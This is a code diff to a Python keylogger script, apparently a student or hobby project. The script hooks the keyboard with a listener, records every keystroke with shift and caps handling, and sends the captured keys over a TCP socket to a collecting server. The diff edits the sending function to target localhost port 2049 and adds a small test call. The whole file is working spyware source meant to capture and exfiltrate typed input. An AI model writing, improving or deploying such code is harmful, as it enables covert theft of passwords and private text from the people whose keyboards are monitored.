@@ -14,6 +14,7 @@ ctrl_l = False
 alt_r = False
 shift = False
 
+
 def list(k):
     global liste, string, caps, ctrl_l, shift, alt_r
     if k == 'Key.space':
@@ -32,7 +33,7 @@ def list(k):
         liste = []
         string = ''
     else:
-        if caps == True:
+        if caps is True:
             k = k.upper()
             if k[1] == ",":
                 k = "'?'"
@@ -95,6 +96,8 @@ def on_release(key):
         caps ^= True
     else:
         list('{0}'.format(key))
+
+
 def on_press(key):
     global ctrl_l, alt_r, shift, caps
     if '{0}'.format(key)=='Key.ctrl_l' :
@@ -105,15 +108,20 @@ def on_press(key):
         shift = True
         caps ^= True
 
+
 def send_list():
-    global liste
-    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    socket.connect((hote, port))
-    socket.send("DESC leNomDuFichier".encode("latin1"))
+    global liste, socket
+    socket.connect(("localhost", 2049))
+    socket.send("DESC leNomDuFichier\n".encode("latin1"))
     for line in liste:
-        socket.send(("SEND {}".format(line)).encode("latin1"))
-    socket.send("STOCK".encode("latin1"))
+        socket.send(("SEND {}\n".format(line)).encode("latin1"))
+    socket.send("STOCK\n".encode("latin1"))
+    socket.close()
 
 
-with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+liste = ["aas", "aas", "bbs"]
+socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+send_list()
